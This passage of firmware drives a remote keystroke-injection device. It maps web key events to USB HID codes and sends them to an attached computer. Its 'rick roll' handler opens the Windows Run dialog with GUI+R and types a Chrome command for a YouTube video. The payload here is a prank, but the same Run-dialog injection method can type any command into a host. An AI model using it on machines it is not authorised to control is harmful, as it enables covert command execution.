    Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID));
    printKeyboardHIDStatus();
    delay(120);
    KeyInjectionStruct = {0};
    Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID));
    printKeyboardHIDStatus();
}



void printKeyboardHIDStatus()
 {

HID_KEYBD_Info_TypeDef temp;
temp.keys[0] = KeyInjectionStruct.KEYCODE1;
char key =  USBH_HID_GetASCIICode(&temp,0);
    Serial.print("Key: ");
      Serial.println(key);
    Serial.print("Left Control: ");
    Serial.println((KeyInjectionStruct.MODIFIER & 0x01) ? "Pressed" : "Released");
    Serial.print("Left Shift: ");
    Serial.println((KeyInjectionStruct.MODIFIER & 0x02) ? "Pressed" : "Released");
    Serial.print("Left Alt: ");
    Serial.println((KeyInjectionStruct.MODIFIER & 0x04) ? "Pressed" : "Released");
    Serial.print("Left GUI: ");
    Serial.println((KeyInjectionStruct.MODIFIER & 0x08) ? "Pressed" : "Released");
    Serial.print("Right Control: ");
    Serial.println((KeyInjectionStruct.MODIFIER & 0x10) ? "Pressed" : "Released");
    Serial.print("Right Shift: ");
    Serial.println((KeyInjectionStruct.MODIFIER & 0x20) ? "Pressed" : "Released");
    Serial.print("Right Alt: ");
    Serial.println((KeyInjectionStruct.MODIFIER & 0x40) ? "Pressed" : "Released");
    Serial.print("Right GUI: ");
    Serial.println((KeyInjectionStruct.MODIFIER & 0x80) ? "Pressed" : "Released");
}


void mapEventCodeToKeyboardHID(const String& eventCode, keyboardHID& hid) {
    memset(&hid, 0, sizeof(keyboardHID)); // Reset struct
if (eventCode == "KeyA") hid.KEYCODE1 = 0x04; // 'a' and 'A'
else if (eventCode == "KeyB") hid.KEYCODE1 = 0x05; // 'b' and 'B'
else if (eventCode == "KeyC") hid.KEYCODE1 = 0x06; // 'c' and 'C'
else if (eventCode == "KeyD") hid.KEYCODE1 = 0x07; // 'd' and 'D'
else if (eventCode == "KeyE") hid.KEYCODE1 = 0x08; // 'e' and 'E'
else if (eventCode == "KeyF") hid.KEYCODE1 = 0x09; // 'f' and 'F'
else if (eventCode == "KeyG") hid.KEYCODE1 = 0x0A; // 'g' and 'G'
else if (eventCode == "KeyH") hid.KEYCODE1 = 0x0B; // 'h' and 'H'
else if (eventCode == "KeyI") hid.KEYCODE1 = 0x0C; // 'i' and 'I'
else if (eventCode == "KeyJ") hid.KEYCODE1 = 0x0D; // 'j' and 'J'
else if (eventCode == "KeyK") hid.KEYCODE1 = 0x0E; // 'k' and 'K'
else if (eventCode == "KeyL") hid.KEYCODE1 = 0x0F; // 'l' and 'L'
else if (eventCode == "KeyM") hid.KEYCODE1 = 0x10; // 'm' and 'M'
else if (eventCode == "KeyN") hid.KEYCODE1 = 0x11; // 'n' and 'N'
else if (eventCode == "KeyO") hid.KEYCODE1 = 0x12; // 'o' and 'O'
else if (eventCode == "KeyP") hid.KEYCODE1 = 0x13; // 'p' and 'P'
else if (eventCode == "KeyQ") hid.KEYCODE1 = 0x14; // 'q' and 'Q'
else if (eventCode == "KeyR") hid.KEYCODE1 = 0x15; // 'r' and 'R'
else if (eventCode == "KeyS") hid.KEYCODE1 = 0x16; // 's' and 'S'
else if (eventCode == "KeyT") hid.KEYCODE1 = 0x17; // 't' and 'T'
else if (eventCode == "KeyU") hid.KEYCODE1 = 0x18; // 'u' and 'U'
else if (eventCode == "KeyV") hid.KEYCODE1 = 0x19; // 'v' and 'V'
else if (eventCode == "KeyW") hid.KEYCODE1 = 0x1A; // 'w' and 'W'
else if (eventCode == "KeyX") hid.KEYCODE1 = 0x1B; // 'x' and 'X'
else if (eventCode == "KeyY") hid.KEYCODE1 = 0x1C; // 'y' and 'Y'
else if (eventCode == "KeyZ") hid.KEYCODE1 = 0x1D; // 'z' and 'Z'

// Numbers
else if (eventCode == "Digit1") hid.KEYCODE1 = 0x1E; // '1'
else if (eventCode == "Digit2") hid.KEYCODE1 = 0x1F; // '2'
else if (eventCode == "Digit3") hid.KEYCODE1 = 0x20; // '3'
else if (eventCode == "Digit4") hid.KEYCODE1 = 0x21; // '4'
else if (eventCode == "Digit5") hid.KEYCODE1 = 0x22; // '5'
else if (eventCode == "Digit6") hid.KEYCODE1 = 0x23; // '6'
else if (eventCode == "Digit7") hid.KEYCODE1 = 0x24; // '7'
else if (eventCode == "Digit8") hid.KEYCODE1 = 0x25; // '8'
else if (eventCode == "Digit9") hid.KEYCODE1 = 0x26; // '9'
else if (eventCode == "Digit0") hid.KEYCODE1 = 0x27; // '0'


    // Function Keys
    else if (eventCode == "F1") hid.KEYCODE1 = 0x3A;
    else if (eventCode == "F2") hid.KEYCODE1 = 0x3B;
    else if (eventCode == "F3") hid.KEYCODE1 = 0x3C;
    else if (eventCode == "F4") hid.KEYCODE1 = 0x3D;
    else if (eventCode == "F5") hid.KEYCODE1 = 0x3E;
    else if (eventCode == "F6") hid.KEYCODE1 = 0x3F;
    else if (eventCode == "F7") hid.KEYCODE1 = 0x40;
    else if (eventCode == "F8") hid.KEYCODE1 = 0x41;
    else if (eventCode == "F9") hid.KEYCODE1 = 0x42;
    else if (eventCode == "F10") hid.KEYCODE1 = 0x43;
    else if (eventCode == "F11") hid.KEYCODE1 = 0x44;
    else if (eventCode == "F12") hid.KEYCODE1 = 0x45;

    // Common Control Keys
    else if (eventCode == "Enter") hid.KEYCODE1 = 0x28;
    else if (eventCode == "Escape") hid.KEYCODE1 = 0x29;
    else if (eventCode == "Backspace") hid.KEYCODE1 = 0x2A;
    else if (eventCode == "Tab") hid.KEYCODE1 = 0x2B;
    else if (eventCode == "Space") hid.KEYCODE1 = 0x2C;
    else if (eventCode == "Minus") hid.KEYCODE1 = 0x2D;
    else if (eventCode == "Equal") hid.KEYCODE1 = 0x2E;
    else if (eventCode == "BracketLeft") hid.KEYCODE1 = 0x2F;
    else if (eventCode == "BracketRight") hid.KEYCODE1 = 0x30;
    else if (eventCode == "Backslash") hid.KEYCODE1 = 0x31;
    else if (eventCode == "Semicolon") hid.KEYCODE1 = 0x33;
    else if (eventCode == "Quote") hid.KEYCODE1 = 0x34;
    else if (eventCode == "Backquote") hid.KEYCODE1 = 0x35;
    else if (eventCode == "Comma") hid.KEYCODE1 = 0x36;
    else if (eventCode == "Period") hid.KEYCODE1 = 0x37;
    else if (eventCode == "Slash") hid.KEYCODE1 = 0x38;
    else if (eventCode == "CapsLock") hid.KEYCODE1 = 0x39;
	
 if (eventCode == "ControlLeft") hid.MODIFIER |= 0x01; // Bit 0: Left Control
else if (eventCode == "ShiftLeft") hid.MODIFIER |= 0x02; // Bit 1: Left Shift
else if (eventCode == "AltLeft") hid.MODIFIER |= 0x04; // Bit 2: Left Alt
else if (eventCode == "MetaLeft") hid.MODIFIER |= 0x08; // Bit 3: Left GUI (Windows/Command key)
else if (eventCode == "ControlRight") hid.MODIFIER |= 0x10; // Bit 4: Right Control
else if (eventCode == "ShiftRight") hid.MODIFIER |= 0x20; // Bit 5: Right Shift
else if (eventCode == "AltRight") hid.MODIFIER |= 0x40; // Bit 6: Right Alt
else if (eventCode == "MetaRight") hid.MODIFIER |= 0x80; // Bit 7: Right GUI (Windows/Command key)

}


void handleRickRollPage() {
    String html = "<!DOCTYPE html><html><head><title>Rick Roll Activated</title></head><body>"
                  "<h1>Rick Roll Activated</h1>"
                  "<button onclick=\"window.location.href='/';\">Back to Home</button>"
                  "</body></html>";
    server.send(200, "text/html", html);
}




// void handleRickRoll() {
//   memset(&KeyInjectionStruct, 0, sizeof(keyboardHID));
//   KeyInjectionStruct.MODIFIER |= 0x80; //windows key
//   KeyInjectionStruct.KEYCODE1 = 0x15; // r key
//  Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID));
//    memset(&KeyInjectionStruct, 0, sizeof(keyboardHID));
//     Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID));
//     delay(30);
//     typeTheString();
//     //press enter
// }
void handleRickRoll() {
  server.sendHeader("Location", "/rick-roll-page", true);   
  server.send(302, "text/plain", "");
  memset(&KeyInjectionStruct, 0, sizeof(keyboardHID));
  KeyInjectionStruct.MODIFIER |= 0x80; //windows key
  KeyInjectionStruct.KEYCODE1 = 0x15; // r key
  Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID));
  memset(&KeyInjectionStruct, 0, sizeof(keyboardHID));
  Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID));
  delay(50);
  typeTheString();
  //press enter

}







void sendKeyPress(uint8_t keyCode, bool shift) {
    memset(&KeyInjectionStruct, 0, sizeof(keyboardHID));
    if (shift) {
        KeyInjectionStruct.MODIFIER |= 0x20; 
    }
    KeyInjectionStruct.KEYCODE1 = keyCode; // Set the key code
    Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID)); 
    delay(50);
    memset(&KeyInjectionStruct, 0, sizeof(keyboardHID)); 
    Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID)); 
    delay(50);
}


void typeTheString() {
    // Typing "chrome "
    sendKeyPress(0x06, false); // 'c'
    sendKeyPress(0x0B, false); // 'h'
    sendKeyPress(0x15, false); // 'r'
    sendKeyPress(0x12, false); // 'o'
    sendKeyPress(0x10, false); // 'm'
    sendKeyPress(0x08, false); // 'e'
    sendKeyPress(0x2C, false); // SPACE
       sendKeyPress(0x1C, false); // 'y'
    sendKeyPress(0x12, false); // 'o'
    sendKeyPress(0x18, false); // 'u'
    sendKeyPress(0x17, false); // 't'
    sendKeyPress(0x18, false); // 'u'
    sendKeyPress(0x05, false); // 'b'
    sendKeyPress(0x08, false); // 'e'
    sendKeyPress(0x37, false); // '.'
    sendKeyPress(0x06, false); // 'c'
    sendKeyPress(0x12, false); // 'o'
    sendKeyPress(0x10, false); // 'm'
    sendKeyPress(0x38, false); // '/'
    sendKeyPress(0x1A, false); // 'w'
    sendKeyPress(0x04, false); // 'a'
    sendKeyPress(0x17, false); // 't'
    sendKeyPress(0x06, false); // 'c'
    sendKeyPress(0x0B, false); // 'h'
    sendKeyPress(0x38, true); // '?'
    sendKeyPress(0x19, false); // 'v'
    sendKeyPress(0x2E, false);  // '=' 
    sendKeyPress(0x07, false); // 'd'
    sendKeyPress(0x14, true); // 'Q'
    sendKeyPress(0x1A, false); // 'w'
    sendKeyPress(0x21, false); // '4'
    sendKeyPress(0x1A, false); // 'w'
    sendKeyPress(0x26, false); // '9'
    sendKeyPress(0x1A, true); // 'W'
    sendKeyPress(0x0A, false); // 'g'
    sendKeyPress(0x1B, true); // 'X'
    sendKeyPress(0x06, false); // 'c'
    sendKeyPress(0x14, true); // 'Q'
     sendKeyPress(0x28, false); // enter

}


